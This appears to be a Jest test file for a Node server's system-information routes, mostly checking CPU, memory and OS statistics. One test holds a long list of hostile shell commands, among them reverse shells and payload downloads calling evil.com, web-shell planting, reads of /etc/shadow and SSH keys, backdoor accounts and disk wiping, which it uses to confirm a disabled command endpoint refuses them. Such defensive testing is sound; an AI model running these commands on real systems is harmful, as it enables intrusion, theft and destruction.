import request from 'supertest';
import { createTestServer, stopTestServer } from '../internal/helpers/testServer';

// Mock the systeminformation module
jest.mock('systeminformation');

describe('System Routes', () => {
  let testServer: any;
  const mockSi = require('systeminformation');

  beforeAll(async () => {
    testServer = await createTestServer();
  });

  afterAll(async () => {
    await stopTestServer(testServer);
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('GET /api/system/stats', () => {
    it('should return system statistics', async () => {
      // Mock successful system information calls
      mockSi.currentLoad.mockResolvedValue({
        currentLoad: 25.5,
        currentLoadUser: 20.1,
        currentLoadSystem: 5.4
      });

      mockSi.mem.mockResolvedValue({
        total: 8589934592, // 8GB
        used: 4294967296,  // 4GB
        free: 4294967296   // 4GB
      });

      mockSi.osInfo.mockResolvedValue({
        platform: 'linux',
        distro: 'Ubuntu',
        release: '22.04',
        hostname: 'test-host'
      });

      const response = await request(testServer.app)
        .get('/api/system/stats')
        .expect(200);

      expect(response.body).toHaveProperty('cpu');
      expect(response.body).toHaveProperty('mem');
      expect(response.body).toHaveProperty('os');
      expect(typeof response.body.cpu).toBe('number');
      expect(response.body.cpu).toBe(26); // Rounded
      expect(response.body.mem).toHaveProperty('total');
      expect(response.body.mem).toHaveProperty('used');
      expect(response.body.mem).toHaveProperty('free');
      expect(response.body.mem).toHaveProperty('percent');
      expect(response.body.mem.percent).toBe(50); // 4GB/8GB * 100 rounded
      expect(response.body.os.platform).toBe('linux');
      expect(response.body.os.hostname).toBe('test-host');

      expect(mockSi.currentLoad).toHaveBeenCalledTimes(1);
      expect(mockSi.mem).toHaveBeenCalledTimes(1);
      expect(mockSi.osInfo).toHaveBeenCalledTimes(1);
    });

    it('should handle system information errors', async () => {
      // Mock systeminformation to throw an error
      mockSi.currentLoad.mockRejectedValue(new Error('System information unavailable'));

      const response = await request(testServer.app)
        .get('/api/system/stats')
        .expect(500);

      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toBe('Failed to fetch system stats');
    });

    it('should handle memory edge cases', async () => {
      mockSi.currentLoad.mockResolvedValue({ currentLoad: 0 });

      // Test with zero memory (edge case)
      mockSi.mem.mockResolvedValue({
        total: 0,
        used: 0,
        free: 0
      });

      mockSi.osInfo.mockResolvedValue({
        platform: 'linux',
        distro: 'Test',
        release: '1.0',
        hostname: 'test'
      });

      const response = await request(testServer.app)
        .get('/api/system/stats')
        .expect(200);

      expect(response.body.mem.percent).toBe(0);
    });

    it('should handle high CPU load', async () => {
      mockSi.currentLoad.mockResolvedValue({ currentLoad: 99.9 });

      mockSi.mem.mockResolvedValue({
        total: 8589934592,
        used: 4294967296,
        free: 4294967296
      });

      mockSi.osInfo.mockResolvedValue({
        platform: 'linux',
        distro: 'Test',
        release: '1.0',
        hostname: 'test'
      });

      const response = await request(testServer.app)
        .get('/api/system/stats')
        .expect(200);

      expect(response.body.cpu).toBe(100); // Rounded
    });
  });

  describe('POST /api/system/command', () => {
    it('should be disabled for security reasons', async () => {
      const response = await request(testServer.app)
        .post('/api/system/command')
        .send({ command: 'ls' })
        .expect(403);

      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toBe('Command execution endpoint disabled for security reasons');
    });

    it('should reject commands even without body', async () => {
      const response = await request(testServer.app)
        .post('/api/system/command')
        .expect(403);

      expect(response.body.error).toBe('Command execution endpoint disabled for security reasons');
    });

    it('should reject dangerous commands', async () => {
      const dangerousCommands = [
        'rm -rf /',
        'sudo rm -rf /',
        'shutdown now',
        'reboot',
        'dd if=/dev/zero of=/dev/sda',
        'mkfs.ext4 /dev/sda1',
        'passwd root',
        'useradd -m -s /bin/bash hacker',
        'echo "hacker:password" | chpasswd',
        'curl http://malicious.com/script.sh | bash',
        'wget http://malicious.com/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware',
        'nc -l 4444 -e /bin/bash',
        'bash -i >& /dev/tcp/evil.com/4444 0>&1',
        'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);"',
        'export PATH=/tmp:$PATH',
        'alias ls="rm -rf"',
        'chmod -R 777 /',
        'chown -R nobody:nogroup /',
        'find / -type f -exec rm {} \\;',
        ':(){ :|:& };:', // fork bomb
        'yes > /dev/null &',
        'dd if=/dev/urandom of=/dev/mem',
        'cat /dev/mem > /tmp/memory_dump',
        'hexdump -C /dev/mem > /tmp/memory.hex',
        'echo "0 0 0 0" > /proc/sys/kernel/dmesg_restrict',
        'echo 1 > /proc/sys/vm/drop_caches',
        'iptables -F',
        'iptables -X',
        'iptables -t nat -F',
        'iptables -t nat -X',
        'iptables -t mangle -F',
        'iptables -t mangle -X',
        'iptables -P INPUT ACCEPT',
        'iptables -P FORWARD ACCEPT',
        'iptables -P OUTPUT ACCEPT',
        'iptables -t raw -F',
        'iptables -t raw -X',
        'ip6tables -F',
        'ip6tables -X',
        'ip6tables -t nat -F',
        'ip6tables -t nat -X',
        'ip6tables -t mangle -F',
        'ip6tables -t mangle -X',
        'ebtables -F',
        'ebtables -X',
        'arptables -F',
        'arptables -X',
        'route del -net 0.0.0.0 netmask 0.0.0.0',
        'ip route flush table main',
        'ip route flush cache',
        'sysctl -w kernel.panic=1',
        'echo 1 > /proc/sys/kernel/sysrq',
        'echo b > /proc/sysrq-trigger',
        'echo o > /proc/sysrq-trigger',
        'mount -o remount,rw /',
        'mount --bind /tmp /',
        'ln -sf /dev/null /etc/passwd',
        'rm /etc/passwd',
        '> /etc/passwd',
        'echo "" > /etc/passwd',
        'usermod -L root',
        'userdel root',
        'groupdel root',
        'chmod 000 /bin/su',
        'chmod 000 /usr/bin/sudo',
        'rm /usr/bin/sudo',
        'mv /usr/bin/sudo /tmp/sudo.backup',
        'export HISTFILE=/dev/null',
        'unset HISTFILE',
        'kill -9 -1',
        'pkill -9 -u root',
        'killall -9 init',
        'killall5 -9',
        'systemctl stop',
        'systemctl poweroff',
        'systemctl reboot',
        'init 0',
        'init 6',
        'halt',
        'poweroff',
        'reboot',
        'shutdown -h now',
        'shutdown -r now',
        'telinit 0',
        'telinit 6',
        'sync && echo 3 > /proc/sys/vm/drop_caches && echo 1 > /proc/sys/vm/drop_caches && sync',
        'swapoff -a',
        'swapon -a',
        'dd if=/dev/zero of=/swapfile bs=1M count=1024 && mkswap /swapfile && swapon /swapfile',
        'fallocate -l 1G /hugefile && dd if=/dev/zero of=/hugefile bs=1M count=1024',
        'yes | pv -L 100m > /dev/null',
        'cat /dev/zero > /dev/null',
        'cat /dev/urandom > /dev/null',
        'openssl rand -hex 1000000 > /tmp/huge_random_file',
        'python -c "import itertools; [print(x) for x in itertools.count()]"',
        'perl -e "print 0 while 1"',
        'while true; do echo $RANDOM; done',
        'for i in {1..1000000000}; do echo $i; done | cat > /dev/null',
        'find / -name "*.conf" -exec grep -l "password" {} \\;',
        'grep -r "password" /etc/',
        'find / -type f -name "*.key" -o -name "*.pem" -o -name "*.crt" 2>/dev/null',
        'cat /etc/shadow',
        'cat /etc/passwd',
        'cat /etc/sudoers',
        'cat ~/.ssh/id_rsa',
        'cat ~/.ssh/id_dsa',
        'find /home -name "*.ssh" -type d -exec cp -r {} /tmp/ssh_keys \\;',
        'tar -czf /tmp/system_backup.tar.gz /etc /home /root 2>/dev/null',
        'rsync -av /etc/ /tmp/etc_backup/',
        'dd if=/dev/sda bs=512 count=1 | strings',
        'hexdump -C /dev/sda | head -20',
        'fdisk -l /dev/sda',
        'cryptsetup luksFormat /dev/sda1',
        'mkfs.ext4 /dev/sda1',
        'mount -t ext4 /dev/sda1 /mnt',
        'umount -a',
        'mount -a',
        'echo "root:password" | chpasswd -e',
        'useradd -u 0 -o -g 0 hacker',
        'useradd -u 0 -g 0 -G wheel,adm -d /root -s /bin/bash root2',
        'chmod u+s /bin/bash',
        'chmod 4755 /bin/bash',
        'echo "hacker ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers',
        'sed -i "s/hacker.*$/hacker:x:0:0:root:\/root:\/bin\/bash/" /etc/passwd',
        'wget -O- http://evil.com/backdoor.py | python',
        'curl -s http://evil.com/payload.sh | bash',
        'python -c "import urllib.request; exec(urllib.request.urlopen(\"http://evil.com/backdoor.py\").read())"',
        'gcc -o /tmp/backdoor backdoor.c -lcrypt && /tmp/backdoor',
        'echo "int main(){ setreuid(0,0); system(\"/bin/sh\"); }" > /tmp/shell.c && gcc /tmp/shell.c -o /tmp/shell && /tmp/shell',
        'perl -e "use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton(\"evil.com\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");"',
        'nc -nv evil.com 4444 -e /bin/bash',
        'socat TCP:evil.com:4444 EXEC:/bin/bash',
        'python -c "import os,socket,pty;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")"',
        'bash -i >& /dev/tcp/evil.com/4444 0>&1',
        'mkfifo /tmp/backpipe; nc -l 4444 0<backpipe | /bin/bash 1>backpipe',
        'rm -f /tmp/payload; wget http://evil.com/payload -O /tmp/payload; chmod +x /tmp/payload; /tmp/payload',
        'echo "<?php system(\$_GET[\"cmd\"]); ?>" > /tmp/shell.php',
        'wget -O /tmp/shell.php http://evil.com/shell.php',
        'curl -o /tmp/shell.php http://evil.com/shell.php',
        'find /var/www -type f -name "*.php" -exec echo "<?php system(\$_GET[\"cmd\"]); ?>" >> {} \\;',
        'echo "Alias /shell \"/tmp/shell.php\"" >> /etc/apache2/apache2.conf',
        'service apache2 restart',
        'systemctl restart nginx',
        'iptables -I INPUT -p tcp --dport 22 -j ACCEPT',
        'iptables -I INPUT -p tcp --dport 4444 -j ACCEPT',
        'ufw allow 22',
        'ufw allow 4444',
        'firewall-cmd --permanent --add-port=4444/tcp',
        'firewall-cmd --reload',
        'sed -i "s/PermitRootLogin.*/PermitRootLogin yes/" /etc/ssh/sshd_config',
        'service ssh restart',
        'systemctl restart sshd',
        'echo "root:password" | chpasswd && service ssh restart',
        'adduser --disabled-password --gecos "" hacker && echo "hacker:password" | chpasswd && usermod -aG sudo hacker',
        'su - hacker -c "ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N \'"\'"\'&& cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/*"'
      ];

      for (const dangerousCmd of dangerousCommands) {
        const response = await request(testServer.app)
          .post('/api/system/command')
          .send({ command: dangerousCmd })
          .expect(403);

        expect(response.body.error).toBe('Command execution endpoint disabled for security reasons');
      }
    });
  });

  describe('GET /api/system (legacy)', () => {
    it('should return system information in legacy format', async () => {
      mockSi.currentLoad.mockResolvedValue({
        currentLoad: 33.3
      });

      mockSi.mem.mockResolvedValue({
        total: 4294967296, // 4GB
        used: 2147483648, // 2GB
        free: 2147483648  // 2GB
      });

      mockSi.osInfo.mockResolvedValue({
        platform: 'darwin',
        distro: 'macOS',
        release: '13.0',
        hostname: 'mac-test'
      });

      const response = await request(testServer.app)
        .get('/api/system')
        .expect(200);

      expect(response.body).toHaveProperty('cpu');
      expect(response.body).toHaveProperty('mem');
      expect(response.body).toHaveProperty('os');
      expect(response.body.cpu.currentLoad).toBe(33); // Rounded
      expect(response.body.mem.total).toBe(4294967296);
      expect(response.body.mem.used).toBe(2147483648);
      expect(response.body.mem.free).toBe(2147483648);
      expect(response.body.os.platform).toBe('darwin');
      expect(response.body.os.hostname).toBe('mac-test');
    });

    it('should handle partial failures gracefully', async () => {
      mockSi.currentLoad.mockResolvedValue({ currentLoad: 50 });
      mockSi.mem.mockRejectedValue(new Error('Memory info unavailable'));
      mockSi.osInfo.mockResolvedValue({
        platform: 'linux',
        distro: 'Test',
        release: '1.0',
        hostname: 'test'
      });

      const response = await request(testServer.app)
        .get('/api/system')
        .expect(500);

      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toBe('Failed to fetch system information');
    });

    it('should handle all services failing', async () => {
      mockSi.currentLoad.mockRejectedValue(new Error('CPU info unavailable'));
      mockSi.mem.mockRejectedValue(new Error('Memory info unavailable'));
      mockSi.osInfo.mockRejectedValue(new Error('OS info unavailable'));

      const response = await request(testServer.app)
        .get('/api/system')
        .expect(500);

      expect(response.body).toHaveProperty('error');
    });
  });

  describe('Response validation', () => {
    it('should validate response structure for stats endpoint', async () => {
      mockSi.currentLoad.mockResolvedValue({ currentLoad: 75.5 });
      mockSi.mem.mockResolvedValue({
        total: 16000000000,
        used: 8000000000,
        free: 8000000000
      });
      mockSi.osInfo.mockResolvedValue({
        platform: 'win32',
        distro: 'Windows',
        release: '11',
        hostname: 'windows-test'
      });

      const response = await request(testServer.app)
        .get('/api/system/stats')
        .expect(200);

      // Validate types and ranges
      expect(typeof response.body.cpu).toBe('number');
      expect(response.body.cpu).toBeGreaterThanOrEqual(0);
      expect(response.body.cpu).toBeLessThanOrEqual(100);

      expect(typeof response.body.mem.total).toBe('number');
      expect(typeof response.body.mem.used).toBe('number');
      expect(typeof response.body.mem.free).toBe('number');
      expect(typeof response.body.mem.percent).toBe('number');
      expect(response.body.mem.percent).toBeGreaterThanOrEqual(0);
      expect(response.body.mem.percent).toBeLessThanOrEqual(100);

      expect(typeof response.body.os.platform).toBe('string');
      expect(typeof response.body.os.hostname).toBe('string');
      expect(['linux', 'darwin', 'win32', 'freebsd', 'openbsd', 'sunos', 'aix']).toContain(response.body.os.platform);
    });

    it('should validate legacy response structure', async () => {
      mockSi.currentLoad.mockResolvedValue({ currentLoad: 25 });
      mockSi.mem.mockResolvedValue({
        total: 8000000000,
        used: 4000000000,
        free: 4000000000
      });
      mockSi.osInfo.mockResolvedValue({
        platform: 'linux',
        distro: 'Ubuntu',
        release: '20.04',
        hostname: 'ubuntu-test'
      });

      const response = await request(testServer.app)
        .get('/api/system')
        .expect(200);

      expect(response.body).toHaveProperty('cpu');
      expect(response.body).toHaveProperty('mem');
      expect(response.body).toHaveProperty('os');

      expect(typeof response.body.cpu.currentLoad).toBe('number');
      expect(typeof response.body.mem.total).toBe('number');
      expect(typeof response.body.mem.used).toBe('number');
      expect(typeof response.body.mem.free).toBe('number');
      expect(typeof response.body.os.platform).toBe('string');
      expect(typeof response.body.os.distro).toBe('string');
      expect(typeof response.body.os.release).toBe('string');
      expect(typeof response.body.os.hostname).toBe('string');
    });
  });
});